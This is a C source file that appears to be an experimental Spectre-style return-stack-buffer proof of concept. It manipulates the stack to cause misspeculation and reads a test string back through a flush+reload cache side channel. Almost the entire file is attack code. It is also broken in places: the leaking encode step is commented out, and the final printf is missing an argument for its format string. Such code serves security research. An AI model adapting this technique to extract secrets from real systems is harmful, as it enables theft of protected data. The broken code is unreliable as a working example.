#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

#include "../sidechannel/flush_reload.h"


#define CACHE_MISS 80

// Pop return address from the software stack, causing misspeculation when hitting the return
int __attribute__ ((noinline)) call_manipulate_stack() {
  register uintptr_t sp asm ("sp");
#if defined(__i386__) || defined(__x86_64__)
  asm volatile("pop %%rax\n" : : : "rax");
  _mm_clflush(sp);
#elif defined(__aarch64__)
  asm volatile("ldp x29, x30, [sp],#16\n" : : : "x29");
#endif
  return 0;
}

int __attribute__ ((noinline)) call_leak(fr_channel *channel, char s) {
  // Manipulate the stack so that we don't return here, but to call_start
  //maccess(&secret);
  //maccess(probe_buf);
  //maccess(&pagesize);
  //_mm_clflush(&call_manipulate_stack);
  //_mm_lfence();
  call_manipulate_stack();
  // architecturally, this is never executed
  // Encode data in covert channel
  
  printf("a");
  //encode(channel,s);
  _mm_mfence();
  return 2;
}

int __attribute__ ((noinline)) call_start(fr_channel *channel, char s) {
  call_leak(channel, s);
  _mm_mfence();
  return 1;
}

void confuse_compiler() {
  // this function -- although never called -- is required
  // otherwise, the compiler replaces the calls with jumps
  char s = 'A';
  fr_channel *channel;
  channel = malloc(sizeof(fr_channel));

    make_channel(channel);

  call_start(0,s);
  call_leak(0,s);
  call_manipulate_stack();
  free_channel(channel);
  free(channel);

}

int main(int argc, const char **argv) {
  // Detect cache threshold
  char* secret = "foobar";
  size_t secret_size = 6;

    static fr_channel *channel;
    channel = malloc(sizeof(fr_channel));

    make_channel(channel);

  _mm_mfence();
  for (int p =0; p < 8; p++) { // ! introducing for loop changes where a hit is measured
    _mm_mfence();
    // for every byte in the string
    
    
    call_start(channel,secret[p % secret_size]);
    //call_start(channel,'A');
    _mm_mfence();

    // Recover data from covert channel
    
    printf("hit at %d: '%c'\n",probe(channel,CACHE_MISS));

    _mm_mfence();
  }
  free_channel(channel);
  free(channel);

  return (0);
}
